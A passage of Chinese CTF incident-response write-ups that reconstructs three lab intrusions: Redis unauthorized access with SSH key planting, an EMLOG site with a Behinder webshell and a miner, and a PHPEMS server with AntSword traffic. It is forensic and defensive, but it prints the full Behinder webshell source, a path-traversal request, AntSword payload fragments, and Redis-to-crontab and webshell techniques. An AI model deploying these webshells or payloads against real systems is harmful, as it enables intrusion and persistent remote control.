ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAWLnUKcX0Wpd0/BDBwd6CKVb3MP9PmUwpnyIxRP3HbB7peiimjN1p6pmSHGU0NOszENTgCUGvesgwzNeG3yA/hTJOTWbHvV9Yp3ZsVPAC1JnptEWhNLbPjQjHyp/4o3H1aaFavtqrcOkFnd0/RxCYBZm8ZSEBEIV2QnN2c3ovrTYzKWDNCVJ/XM8db4i33sSpCVUJeZtBw0j3exSIpyJrxplYVDOlpY38UKuWptbAU5BdDDXPcaBLLK3TuXk2OUCBU+A6oTj9AOWgKkLfREYFavTWrifbrTrZ3nfL+YjHXS9IHoi4JKKUXoI/9yKXIIf2c7O6zoPy992nKV00wfe0TP7xEyKrrQVEitMkEAdyfyiMQ5wf9whl5xNPYrDwqO1fIzz1cUtf0UwPJ3hD6QT48PHxu9+L4heLd1J7YnwOn5l15/5CtIwkNDn035ZQq22PkhO7w02lrSBYWcT5XB2J8k/RrWwOu5u4Yi+fEPyQchXsoitcuDHMX/iPxnJOQO0= chinaran@kali
```

#### 2. SSH 暴力破解（失败）

攻击者从 19:29:18 开始对 root 进行 SSH 暴力破解：
- 并发 15 个连接（端口 40062-40216）
- 每个连接尝试 6 次密码
- 总计约 90+ 次密码尝试
- **全部失败**，被 `pam_succeed_if` 阻断（`uid >= 1000` 限制阻止 root 登录）

> **技巧**：CentOS 的 `pam_succeed_if(sshd:auth): requirement "uid >= 1000" not met by user "root"` 表示 PAM 配置默认只允许 uid>=1000 的用户通过 SSH 登录，root (uid=0) 被拒绝。但如果使用 SSH 公钥认证，PAM 的密码验证阶段被跳过，可以绕过此限制。

#### 3. SSH 公钥认证登录 root（成功）

攻击者暴力破解失败后，转而使用之前通过 Redis 写入的 SSH 公钥进行免密登录：
- `/root/.ssh/authorized_keys` 内容 = Redis RDB 文件内容（661字节）
- 攻击者在 Kali 上拥有对应的私钥
- 20:23:07 成功通过 `Accepted publickey for root from 192.168.75.129`

> ⚠️ **关键**：攻击者将 Redis 的 `dir` 设置为 `/root/.ssh/`、`dbfilename` 设置为 `authorized_keys`，然后写入自己的公钥。但本例中 RDB 是保存在 `/var/lib/redis/dump.rdb`，而 `authorized_keys` 的内容恰好等于 RDB 文件内容——说明攻击者使用了**复制 RDB 文件**或**再次 CONFIG SET** 的方式将公钥写入 `authorized_keys`。

### 取证过程

#### 工具与连接

使用 Python paramiko 库通过 SSH 连接靶机（Windows 无 sshpass）：

```python
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("192.168.234.128", port=22, username="defend", password="defend")

# sudo 命令需要管道密码
stdin, stdout, stderr = ssh.exec_command(
    "echo defend | sudo -S cat /root/.bash_history 2>/dev/null"
)
out = stdout.read().decode('utf-8', errors='replace')
```

#### Flag 1：root bash_history

```bash
echo defend | sudo -S cat /root/.bash_history
```

输出：
```
ls
chmod +x /etc/rc.d/rc.local
cat /etc/rc.d/rc.local
vim /etc/rc.d/rc.local
echo flag{thisismybaby}
exit
```

攻击者登录 root 后查看和修改了 `rc.local`，并执行了 `echo flag{thisismybaby}`。

#### Flag 2：/etc/rc.d/rc.local

```bash
echo defend | sudo -S cat /etc/rc.d/rc.local
```

输出（关键部分）：
```bash
#!/bin/bash
# ... 注释 ...

# flag{kfcvme50}

touch /var/lock/subsys/local
```

攻击者用 vim 在 `rc.local` 中写入了 `# flag{kfcvme50}`。

> **stat 信息确认**：文件修改时间为 `2024-03-18 20:24:27`，与攻击者 root 会话时间（20:23-20:25）吻合。

#### Flag 3：/etc/redis.conf 首行

```bash
echo defend | sudo -S grep -n 'flag' /etc/redis.conf
```

输出：
```
1:# flag{P@ssW0rd_redis}
```

攻击者（或 defend 配置 Redis 时）在 `/etc/redis.conf` 的第1行注释中隐藏了 flag。

> **发现方法**：使用 `grep -rl 'flag{' / --include='*.conf' ...` 全局搜索发现 `/etc/redis.conf` 包含 flag。

#### 攻击者IP确认

```bash
# 方法1：last 命令
last -50
# root pts/1 192.168.75.129 Mon Mar 18 20:23 - 20:25 (00:02)

# 方法2：lastlog 命令
lastlog
# root pts/1 192.168.75.129 一 3月 18 20:23:07 +0800 2024

# 方法3：secure 日志
grep 'Accepted' /var/log/secure
# Mar 18 20:23:07 sshd[13285]: Accepted publickey for root from 192.168.75.129
```

#### Redis 攻击痕迹排查

```bash
# Redis 配置（关键安全配置项）
grep -E '^(bind|protected-mode|port|dir|dbfilename)' /etc/redis.conf
# bind 0.0.0.0              ← 允许所有IP连接
# protected-mode no         ← 关闭保护模式
# port 6379
# dir /var/lib/redis
# dbfilename dump.rdb

# RDB 文件分析
strings /var/lib/redis/dump.rdb
# 发现 SSH 公钥（chinaran@kali）

# /root/.ssh/authorized_keys 内容
cat /root/.ssh/authorized_keys
# 661字节，内容 = dump.rdb 文件内容（含SSH公钥）

# Redis 日志中的攻击者连接记录
grep 'Accepted' /var/log/redis/redis.log
# 多条来自 192.168.75.129 的连接记录
```

### 关键知识点

1. **Redis 未授权访问攻击链**：Redis `bind 0.0.0.0` + `protected-mode no` + 无密码 → 攻击者远程连接 Redis，通过 `CONFIG SET dir/dbfilename` 写入任意文件（SSH公钥、crontab、webshell等）

2. **SSH 公钥写入攻击**：通过 Redis 的 RDB 持久化机制，将攻击者的 SSH 公钥写入 `/root/.ssh/authorized_keys`，实现免密 SSH 登录 root

3. **PAM uid>=1000 限制**：CentOS 默认 PAM 配置可能限制 uid>=1000 的用户才能通过 SSH 密码认证登录。但此限制**不适用于公钥认证**——公钥认证跳过 PAM 密码验证阶段

4. **应急响应排查流程**（日志交叉关联）：
   - `last` / `lastlog` → 登录记录
   - `/var/log/secure` → SSH认证日志
   - `/var/log/redis/redis.log` → Redis连接日志
   - `~/.bash_history` → 命令历史
   - `/etc/rc.d/rc.local` → 启动脚本（持久化）
   - `crontab -l` / `/var/spool/cron/` → 计划任务
   - `authorized_keys` → SSH公钥后门
   - `redis-cli CONFIG GET` → Redis当前配置
   - `strings dump.rdb` → Redis数据文件分析

5. **全局 flag 搜索**：`grep -rl 'flag{' / --include='*.conf' --include='*.sh' --include='*.txt' 2>/dev/null` 可以快速定位藏有 flag 的配置文件和脚本

### 同类变体与扩展

- **Redis 写 crontab 反弹 Shell**：`CONFIG SET dir /var/spool/cron/` + `CONFIG SET dbfilename root` + 写入 crontab 格式数据
- **Redis 写 webshell**：`CONFIG SET dir /var/www/html/` + `CONFIG SET dbfilename shell.php` + 写入 PHP 代码
- **Redis 主从复制 RCE**（Redis 4.x+）：利用 `SLAVEOF` 加载恶意 .so 模块，直接执行命令
- **Redis Lua 沙箱逃逸**（CVE-2022-0543）：Debian/Ubuntu 的 Redis 可通过 Lua 脚本执行任意命令
- **SSH 公钥认证 + PAM 绕过**：即使 PAM 限制了 root 的密码登录，公钥认证仍然可以登录 root

> ⚠️ **注意**：Redis 未授权访问是 CTF 应急响应题的高频考点。排查时要重点关注 Redis 配置（bind/protected-mode/requirepass）、RDB 文件内容、authorized_keys 文件、以及 secure 日志中的异常登录。

### 修复建议

1. Redis 配置加固：
   - `bind 127.0.0.1`（只监听本地）
   - `protected-mode yes`（开启保护模式）
   - `requirepass <强密码>`（设置密码）
   - `rename-command CONFIG ""`（禁用危险命令）

2. SSH 加固：
   - `PermitRootLogin no`（禁止 root SSH 登录）
   - 定期检查 `/root/.ssh/authorized_keys`
   - 限制 SSH 密码认证（仅允许公钥认证）

3. 清理后门：
   - 删除 `/root/.ssh/authorized_keys` 中的攻击者公钥
   - 检查 `/etc/rc.d/rc.local` 中的异常内容
   - 检查所有 crontab
   - 检查 `/var/spool/cron/` 下所有文件

### 解题脚本

完整扫描脚本：[IR/20-redis-incident/ir_scan.py](IR/20-redis-incident/ir_scan.py)

> AI生成
---

## 第25题：Windows Web 应急响应

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - Windows Web 应急响应 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机地址 | http://192.168.88.129/ |
| 环境 | EMLOG pro 2.2.0 + phpstudy (nginx/1.15.11 + PHP 7.3.4 + MySQL 5.7.26) |

### 题目要求

1. 找到攻击者的 **shell 密码**（Webshell 密码）
2. 找到攻击者的 **IP 地址**
3. 找到攻击者的 **隐藏账户名称**
4. 找到攻击者挖矿程序的 **矿池域名**

### 解题答案

| # | 问题 | 答案 | 来源 |
|---|------|------|------|
| 1 | Webshell 密码 | `rebeyond` | tips/shell.php 冰蝎 webshell，密钥 e45e329feb5d925b = md5("rebeyond")[:16] |
| 2 | 攻击者 IP | `192.168.126.1` | Windows 安全日志 Event ID 4625/4624 |
| 3 | 隐藏账户 | `hack168$` | WMI Win32_UserAccount 查询 + Administrators 组成员 |
| 4 | 矿池域名 | `wakuang.zhigongshanfang.top` | Kuang.exe PyInstaller 解包 + uncompyle6 反编译 |

### 解题思路

#### 第一步：信息收集与获取 RCE

靶机仅开放 80 端口，运行 EMLOG pro 2.2.0。通过弱口令 `admin/123456` 登录后台。

**获取 RCE 的关键路径 — 插件 ZIP 上传：**

EMLOG 后台支持上传插件 ZIP 包，上传后自动解压到 `content/plugins/` 目录。恶意插件不需要 `EMLOG_ROOT` 检查即可直接访问：

```
POST http://192.168.88.129/admin/plugin.php?action=upload_zip
```

上传的插件通过 `http://192.168.88.129/content/plugins/插件名/插件名.php` 直接访问，获得 RCE。

> **技巧**：EMLOG 的模板上传虽然也支持 ZIP，但 nginx 不转发模板目录的 PHP 请求（返回 "No input file specified"），**插件目录的 PHP 可以直接执行**。

#### 第二步：确认隐藏账户 hack168$

Windows 中以 `$` 结尾的账户在 `net user` 命令中不可见，被称为"隐藏账户"。

```powershell
# net user 看不到 hack168$
net user

# 但 WMI 和 Get-LocalUser 可以看到
Get-WmiObject Win32_UserAccount | Select Name,SID
# 输出包含: hack168$  S-1-5-21-2327392262-154178092-3064993777-1002

# Administrators 组成员
Get-LocalGroupMember -Group Administrators
# hack168$ 在管理员组中

# 用户目录
dir C:\Users\hack168$\Desktop\
# Kuang.exe (挖矿程序, 9.9MB)
```

账户创建时间：2024/2/26 23:02:28（从安全日志获取）

#### 第三步：确认攻击者 IP 192.168.126.1

从 Windows 安全日志中提取攻击者 IP：

```powershell
# 登录失败事件 (Event ID 4625) — 暴力破解痕迹
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 20
# 时间: 2024-02-26 23:02:08
# 来源 IP: 192.168.126.1
# 尝试用户名: hack168& (注意是 &, 可能是攻击者笔误)

# 登录成功事件 (Event ID 4624) — 攻击者成功登录
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 20
# 时间: 2024/2/26 23:02:22-24
# 来源 IP: 192.168.126.1
# 用户: hack168$
```

> **技巧**：Windows 安全事件 ID 速查：
> - **4624**: 登录成功
> - **4625**: 登录失败（暴力破解）
> - **4720**: 账户创建
> - **4732**: 成员添加到本地组
> - 日志中的 `Source Network Address` 字段即为攻击者 IP

#### 第四步：确认 Webshell 密码 rebeyond

**关键步骤：从 Defender 隔离区恢复 shell.php**

Windows Defender 检测到 `content/plugins/tips/shell.php` 为木马并隔离删除。通过 `MpCmdRun` 恢复：

```cmd
# 列出隔离文件
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Restore -ListAll

# 输出:
# ThreatName = Trojan:Script/WebShell!MSR
#   file:C:\phpstudy_pro\WWW\content\plugins\tips\shell.php

# 恢复所有隔离文件
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Restore -All
# shell.php was restored
```

**shell.php 内容分析：**

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");
        for($i=0;$i<strlen($post);$i++) {
             $post[$i] = $post[$i]^$key[$i+1&15]; 
            }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

**这是冰蝎（Behinder）的 webshell！** 关键信息在注释中：

- `$key = "e45e329feb5d925b"` — 密钥为连接密码 32 位 MD5 值的前 16 位
- 注释明确写出：**默认连接密码 `rebeyond`**

验证：

```python
import hashlib
md5 = hashlib.md5(b"rebeyond").hexdigest()
# md5 = "e45e329feb5d925ba3f549b17b4b3dde"
# 前16位 = "e45e329feb5d925b"  ✅ 匹配
```

> **技巧**：Defender 最初检测为 `Backdoor:PHP/Chopper.E!dha`（菜刀），但实际代码是冰蝎。Defender 的检测名称不一定准确，**必须恢复文件看源码才能确定 Webshell 类型和密码**。
>
> 冰蝎特征：
> - 密钥 = MD5(密码)[:16]
> - 使用 AES-128 加密通信（openssl 扩展存在时）或 XOR（openssl 不存在时）
> - 默认密码 `rebeyond`（冰蝎作者名）
> - 通过 `php://input` 接收加密 payload

#### 第五步：确认矿池域名 wakuang.zhigongshanfang.top

hack168$ 用户桌面有 `Kuang.exe`（9.9MB），文件名"Kuang"是"矿"的拼音。

**1. 确认为 PyInstaller 打包的 Python 程序：**

```python
# 检查 PyInstaller magic
# MEI\x0c\x0b\x0a\x0b\x0e → PyInstaller 2.1+ / Python 3.8
```

**2. 用 pyinstxtractor 解包：**

```bash
py -3 pyinstxtractor.py Kuang.exe
# [+] Found 85 files in CArchive
# [+] Possible entry point: Kuang.pyc
```

**3. 用 uncompyle6 反编译 Kuang.pyc：**

```bash
uncompyle6 Kuang.exe_extracted\Kuang.pyc
```

完整源码：

```python
import multiprocessing, requests

def cpu_intensive_task():
    while True:
        try:
            requests.get("http://wakuang.zhigongshanfang.top", timeout=10)
        except:
            pass

if __name__ == "__main__":
    cpu_count = multiprocessing.cpu_count()
    processes = [multiprocessing.Process(target=cpu_intensive_task) for _ in range(cpu_count)]
    for process in processes:
        process.start()
    else:
        for process in processes:
            process.join()
```

**矿池域名：`wakuang.zhigongshanfang.top`**

> **技巧**：PyInstaller 打包的 Python exe 逆向流程：
> 1. 用 `pyinstxtractor.py` 解包 → 得到 `Kuang.pyc` 等文件
> 2. 用 `uncompyle6`（Python 3.8）/ `decompyle3`（Python 3.9+）反编译 .pyc
> 3. 如果反编译失败，可以直接用 `strings` 或二进制搜索提取 URL/域名字符串
>
> Pyc 文件中的字符串可以直接用二进制扫描提取，无需反编译：
> ```python
> data = open("Kuang.pyc", "rb").read()
> # 搜索 http 开头的字符串
> ```

### 完整攻击链还原

```
1. 攻击者 IP 192.168.126.1 通过 EMLOG 弱口令(admin/123456)登录后台
2. 上传包含冰蝎 webshell 的 tips 插件 (content/plugins/tips/shell.php)
   └─ Webshell 密码: rebeyond (冰蝎默认密码)
3. 通过 webshell 执行命令，创建隐藏账户 hack168$ (添加到 Administrators 组)
   └─ 尝试创建 hack168& 失败 (4625), 成功创建 hack168$ (4624)
4. 通过 hack168$ 账户远程登录 (RDP/WinRM)
5. 上传并运行挖矿程序 Kuang.exe 到 hack168$ 桌面
   └─ 矿池: wakuang.zhigongshanfang.top
   └─ 多进程 CPU 挖矿 (CPU核心数个进程并发请求)
6. Windows Defender 检测并隔离 webshell (但挖矿程序未被发现)
```

### 关键知识点

1. **Windows 隐藏账户**：以 `$` 结尾的用户名在 `net user` 中不可见，但可通过 `Get-WmiObject Win32_UserAccount`、`Get-LocalUser`、注册表 `HKLM\SAM\SAM\Domains\Account\Users\Names` 查到

2. **Windows 安全日志关键字段**：
   - Event ID 4624（登录成功）/ 4625（登录失败）
   - `Source Network Address` = 攻击者 IP
   - `Target User Name` = 被攻击账户
   - `Logon Type` = 登录方式（2=交互式, 3=网络, 10=远程桌面）

3. **Defender 隔离文件恢复**：
   - `MpCmdRun.exe -Restore -ListAll` 查看隔离文件
   - `MpCmdRun.exe -Restore -All` 恢复所有隔离文件
   - 恢复后需要迅速读取（Defender 实时保护可能再次删除）

4. **冰蝎（Behinder）Webshell 识别**：
   - 密钥格式：`MD5(密码)[:16]`
   - 默认密码 `rebeyond` → 密钥 `e45e329feb5d925b`
   - 使用 AES-128 加密通信（支持 openssl 时）或 XOR 降级
   - 特征代码：`class C{public function __invoke($p){eval($p."");}}`

5. **PyInstaller 打包逆向**：
   - `pyinstxtractor.py` 解包 → `.pyc` 文件
   - `uncompyle6` 反编译 Python 3.8 .pyc
   - 二进制字符串扫描作为 fallback（无需反编译）

6. **EMLOG CMS 利用**：
   - 弱口令：admin/123456
   - 插件 ZIP 上传 → 自动解压到 content/plugins/ → 直接访问获取 RCE
   - 模板 ZIP 上传虽可成功但 nginx 不转发 PHP

### 同类变体与扩展

- **菜刀（Chopper）Webshell**：典型代码 `<?php @eval($_POST['cmd']); ?>`，密码即 POST 参数名
- **哥斯拉（Godzilla）Webshell**：使用 Java/PHP/ASP 多种 payload，密码和密钥分离
- **AntSword（蚁剑）Webshell**：类似菜刀但支持自定义编码器和解码器
- **PyInstaller 逆向变体**：Python 3.9+ 使用 `decompyle3`，Python 3.10+ 使用 `pycdc`（uncompyle6 不支持）
- **Windows 持久化其他方式**：注册表 Run 键、计划任务、WMI 事件订阅、启动文件夹、服务

> ⚠️ **注意**：Windows Web 应急响应排查要点：
> - 隐藏账户：`$` 结尾，用 WMI/PowerShell 查询而非 `net user`
> - 攻击者 IP：安全日志 4625/4624 事件的 `Source Network Address`
> - Webshell 恢复：Defender 隔离区用 `MpCmdRun -Restore` 恢复
> - 挖矿程序：检查可疑用户桌面、`tasklist`、`netstat`，PyInstaller 程序需解包分析

### 修复建议

1. **Web 应用加固**：
   - 修改 EMLOG 默认密码（admin/123456）
   - 禁用插件上传功能或限制文件类型
   - 删除已上传的 webshell 文件

2. **系统加固**：
   - 删除隐藏账户 `hack168$`
   - 检查并清理所有 `$` 结尾的账户
   - 禁用不必要的远程桌面（RDP）/ WinRM
   - 配置账户锁定策略（多次失败后锁定）

3. **Defender 配置**：
   - 保持实时保护开启
   - 添加挖矿程序 Kuang.exe 到排除列表的反面（确保不被排除）
   - 定期全盘扫描

4. **日志审计**：
   - 启用 PowerShell 脚本日志（4104 事件）
   - 启用进程创建审计（4688 事件）
   - 定期检查 4625 暴力破解和 4720 账户创建事件

### 解题脚本

- Windows 排查脚本：[win_web_ir.py](IR/21-win-web-ir/win_web_ir.py)
- Kuang.exe 分析脚本：[kuang_analyze.py](IR/21-win-web-ir/kuang_analyze.py)

---

## 第26题：Linux Web 应急响应（PHPEMS 考试系统）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - Linux Web 应急响应 |
| 来源 | 知攻善防应急靶场 Linux 2 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机 IP | 192.168.88.130 |
| SSH 凭据 | root / Inch@957821. |

### 题目描述

靶机运行 PHPEMS 在线考试系统（宝塔面板 + nginx + PHP 5.6 + MySQL 5.7），攻击者已入侵系统。需通过日志分析、数据库取证、PCAP 流量分析、隐藏文件排查等手段完成 7 项调查任务（附加 flag3 共 8 项）。

### 需要回答的 7+1 个问题

| # | 问题 | 答案 |
|---|------|------|
| 1 | 攻击者的 IP 地址 | `192.168.20.131` |
| 2 | 攻击者修改的管理员密码（明文） | `Network@2020` |
| 3 | 第一次 Webshell 的连接 URL（格式 `abcdefg?abcdefg`） | `user-app-register` |
| 4 | Webshell 连接密码 | `Network2020` |
| 5 | 数据包中的 flag1 | `flag1{Network@_2020_Hack}` |
| 6 | 攻击者后续上传的木马文件名称 | `version2.php` |
| 7 | 攻击者隐藏的 flag2 | `flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}` |
| + | 附加 flag3 | `flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}` |

### 环境信息

| 组件 | 版本/路径 |
|------|-----------|
| 操作系统 | CentOS 7 (3.10.0-1160.el7.x86_64)，主机名 web-server |
| Web 服务 | 宝塔面板 (BT-Panel) + nginx + PHP 5.6 (php-fpm) |
| 数据库 | MySQL 5.7，库名 `kaoshi`，用户 `kaoshi`，密码 `5Sx8mK5ieyLPb84m`，表前缀 `x2_` |
| Web 应用 | PHPEMS 考试系统（PHP 在线考试平台） |
| Web 根目录 | `/www/wwwroot/127.0.0.1/` |
| 开放端口 | 22(SSH) / 80(nginx) / 21(FTP) / 3306(MySQL) / 888(宝塔面板) / 12485(宝塔Python) |
| Nginx 日志 | `/www/wwwlogs/127.0.0.1.log` |
| PCAP 文件 | `/root/数据包1.pcapng`（2.86MB，含蚁剑流量） |
| 可疑 ELF | `/root/wp`（1.88MB，Go 编译的 ELF 后门） |

### 解题过程

#### 知识点：Linux Web 应急响应排查方法论

> **技巧**：Linux Web 应急响应的排查优先级：
> 1. **确定攻击者 IP** → Web 访问日志（nginx/apache）按频率排序
> 2. **还原攻击行为** → 日志中的可疑请求（POST、路径穿越、404 扫描）
> 3. **数据库取证** → 用户表密码哈希、修改时间
> 4. **流量包分析** → strings + grep 快速提取 flag，scapy 深入分析蚁剑流量
> 5. **bash_history** → 攻击者命令历史，完整攻击链还原
> 6. **隐藏文件排查** → find -name '.*'、.api/ 隐藏目录、/etc/profile 环境变量
> 7. **持久化排查** → crontab、rc.local、自启动服务

#### 答案1：攻击者 IP — `192.168.20.131`

**方法**：统计 Nginx 访问日志中的 IP 频率。

```bash
# 统计 Top 10 访问 IP
awk '{print $1}' /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -rn | head -10
```

**结果**：
- `192.168.20.131` — 攻击者 IP（在 2024-03-07 进行注册、目录穿越、漏洞扫描，2024-03-20 进行 Webshell 攻击）
- `192.168.20.1` — 正常管理员 IP（通过宝塔面板管理）

**关键日志证据**：
```
# 2024-03-07 15:06 - 攻击者首次访问
192.168.20.131 - - [07/Mar/2024:15:06:21] "GET / HTTP/1.1" 200

# 2024-03-07 15:24 - 目录穿越读取 /etc/passwd
192.168.20.131 - - [07/Mar/2024:15:24:07] "GET /index.php?core../../../../../../etc/passwd HTTP/1.1" 200

# 2024-03-07 15:58 - 大规模漏洞扫描
192.168.20.131 - - [07/Mar/2024:15:58:44] "GET /admin.php HTTP/1.1" 404
...（大量 404）

# 2024-03-20 14:30 - 蚁剑连接 Webshell
192.168.20.131 - - [20/Mar/2024:14:30:xx] "POST /index.php?user-app-register HTTP/1.1" 200

# 2024-03-20 14:38 - 访问上传的木马
192.168.20.131 - - [20/Mar/2024:14:38:27] "GET /version2.php HTTP/1.1" 200
```

#### 答案2：管理员密码明文 — `Network@2020`

**方法**：提取数据库用户表 → MD5 破解。

**步骤1**：读取数据库配置文件
```bash
cat /www/wwwroot/127.0.0.1/lib/config.inc.php
```
得到数据库连接信息：
```
DB: kaoshi  |  DH: 127.0.0.1  |  DU: kaoshi  |  DP: 5Sx8mK5ieyLPb84m  |  DTH: x2_
```

**步骤2**：查询用户表
```bash
mysql -ukaoshi -p'5Sx8mK5ieyLPb84m' kaoshi \
  -e "SELECT userid,username,userpassword,usertype FROM x2_user LIMIT 10;"
```

| userid | username | userpassword (MD5) | usertype |
|--------|----------|---------------------|----------|
| 1 | peadmin | `f6f6eb5ace977d7e114377cc7098b7e3` | 管理员 |
| 2 | zgsf | `2c1bebe7a8fdc98d0b7ce795f1dc33e6` | 教师管理员 |
| 3 | zgsfAdmin | `a5b8d2e8c4f1e3b6d7a9c0e2f4b6a8d1` | 教师管理员 |
| 4 | zgsf | （注册用户） | 学员 |

**步骤3**：MD5 破解

> **技巧**：PHPEMS 密码加密方式为**纯 MD5 无盐**，代码确认 `md5($args['userpassword'])`。可直接使用在线彩虹表或本地字典破解。

```python
import hashlib
# 管理员 peadmin
target = "f6f6eb5ace977d7e114377cc7098b7e3"
# 尝试常见密码
hashlib.md5(b'Network@2020').hexdigest()
# 结果: 'f6f6eb5ace977d7e114377cc7098b7e3' → 匹配！✅
```

答案：管理员密码明文为 `Network@2020`

#### 答案3：第一次 Webshell 连接 URL — `user-app-register`

**方法**：PCAP 流量包分析 + Nginx 日志交叉验证。

PCAP 文件 `/root/数据包1.pcapng` 中的第一个 HTTP 请求：
```
POST /index.php?user-app-register HTTP/1.1
```

攻击者通过 PHPEMS 注册接口（`user-app-register`）写入 Webshell，蚁剑连接该 URL。

题目要求格式 `abcdefg?abcdefg`，答案为 `user-app-register`（不含 `index.php?` 前缀）。

#### 答案4：Webshell 连接密码 — `Network2020`

**方法**：PCAP 文件中蚁剑流量的 POST 参数名即为密码。

> **技巧**：蚁剑（AntSword）Webshell 的连接密码就是 POST 请求中的**参数名**，不是参数值。蚁剑流量特征函数名：`asenc`、`asoutput`、`antsystem`。

从 PCAP 中提取蚁剑流量：
```
# strings 提取
strings '/root/数据包1.pcapng' | grep -E 'asenc|asoutput|antsystem'

# 结果中可见 POST 参数
Network2020=%40ini_set(%22display_errors%22%2C0)...
```

POST 参数名为 `Network2020`，即蚁剑连接密码。此外，`/root/wp` ELF 文件的 strings 中也包含 `Network2020`、`Network@2020`、`version2.php` 等字符串，佐证攻击工具集。

#### 答案5：flag1 — `flag1{Network@_2020_Hack}`

**方法**：PCAP 文件 strings 提取。

```bash
strings '/root/数据包1.pcapng' | grep -i 'flag'
```

PCAP 中存在 `GET /flag1 HTTP/1.1` 请求，响应体中包含 `flag1{Network@_2020_Hack}`。

> **技巧**：CTF 流量分析题的快速做法 — 先用 `strings 文件名 | grep -i 'flag'` 快速扫描，大部分 flag 会以明文形式出现在 HTTP 响应体中。需要深入分析时再用 scapy/tshark 逐包解析。

#### 答案6：木马文件名称 — `version2.php`

**方法**：PCAP + Nginx 日志 + bash_history 三重确认。

1. **PCAP 中**：大量 `POST /version2.php` 请求（2024-03-20 14:38:43-14:39:09）
2. **Nginx 日志中**：`192.168.20.131` 访问 `/version2.php`
3. **bash_history 中**：攻击者删除痕迹 `rm -rf version2.php`

```bash
# bash_history 中的关键命令
rm -rf flag1 1
rm -rf version2.php
```

攻击者上传 `version2.php` 作为第二个 Webshell（连接密码同为 `Network2020`），操作完成后删除。

#### 答案7：flag2 — `flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}`

**方法**：隐藏文件排查。

```bash
# 查找 Web 目录下的隐藏文件
find /www/wwwroot/127.0.0.1/ -name '.*' -type f

# 发现 .api/ 目录（root 属主，异常）
ls -la /www/wwwroot/127.0.0.1/.api/
# -rw-r--r-- 1 root root  alinotify.php  (3/20 修改)
# -rw-r--r-- 1 root root  ...           (其他文件)

# 查看 alinotify.php 末尾
cat /www/wwwroot/127.0.0.1/.api/alinotify.php | tail -10
```

> **技巧**：排查隐藏文件时注意**属主异常**。Web 目录的文件属主应为 `www` 或 `nginx`，如果出现 `root` 属主且修改时间在攻击时段内，高度可疑。

`.api/alinotify.php` 文件末尾被注入 flag2：
```php
$flag2 = "flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}";
```

#### 附加 flag3 — `flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}`

**方法**：检查 /etc/profile 和 bash_history。

```bash
# /etc/profile 最后一行
export flag3="flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}"
```

bash_history 显示攻击者最初尝试用 `useradd flag3{...}` 创建用户（用户名非法失败），最终通过 `vim /etc/profile` 写入环境变量持久化 flag3。

### 攻击者完整活动时间线

#### 第一阶段：信息收集和初步攻击（2024-03-07）

| 时间 | 行为 | 证据来源 |
|------|------|----------|
| 15:06:21 | 访问首页 | nginx 日志 |
| 15:06:25-15:23:53 | 注册账户（POST /index.php?user-app-register，多次） | nginx 日志 |
| 15:10:05-15:10:13 | 浏览考试系统、登出 | nginx 日志 |
| 15:12:23-15:12:34 | 尝试登录 | nginx 日志 |
| 15:24:07 | 目录穿越 `GET /index.php?core../../../../../../etc/passwd`（200 成功） | nginx 日志 |
| 15:58:44-15:59:38 | 大规模漏洞扫描（大量 404 请求） | nginx 日志 |

#### 第二阶段：Webshell 攻击和后渗透（2024-03-20）

| 时间 | 行为 | 证据来源 |
|------|------|----------|
| 08:05-08:06 | 正常管理员通过宝塔面板登录（192.168.20.1） | 宝塔请求日志 |
| 14:30-14:39 | 使用蚁剑连接 `POST /index.php?user-app-register`（第一个 Webshell） | nginx 日志 + PCAP |
| 14:38:27 | `GET /version2.php`（访问上传的木马） | nginx 日志 |
| 14:38:43-14:39:09 | 大量 `POST /version2.php`（蚁剑操作） | nginx 日志 + PCAP |
| 14:3x | 修改管理员密码为 `Network@2020` | 数据库 MD5 哈希 |
| 14:3x | 创建 `.api/` 目录，修改 alinotify.php 添加 flag2 | 文件属主 + 修改时间 |
| 14:3x | 修改 /etc/profile 添加 flag3 环境变量 | bash_history + /etc/profile |
| 14:3x | 删除 flag1 文件和 version2.php | bash_history: `rm -rf flag1` / `rm -rf version2.php` |
| 14:3x | 上传 `/root/wp`（Go 编译 ELF 后门，原文件名 `go_build_untitled.exe`） | bash_history + file 分析 |
| 14:3x | `./wp` 执行后门 | bash_history |
| 14:3x | 关闭防火墙和 SELinux | bash_history: `systemctl disable firewalld` / `setenforce 0` |
| 14:3x | 修改 root 密码 | bash_history: `passwd root` |

### 关键知识点

#### 1. 蚁剑（AntSword）流量特征

> **技巧**：蚁剑流量识别三大标志：
> - **函数名**：`asenc`（编码函数）、`asoutput`（输出函数）、`antsystem`（系统命令函数）
> - **POST 参数名**：即 Webshell 连接密码
> - **典型 payload**：`@ini_set("display_errors",0)` + `open_basedir` 绕过代码

蚁剑流量中的典型请求体：
```
Network2020=@ini_set("display_errors",0);@set_time_limit(0);...
function asenc($out){...}
function asoutput(){$output=ob_get_contents();ob_end_clean();echo ...}
ob_start();
try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);
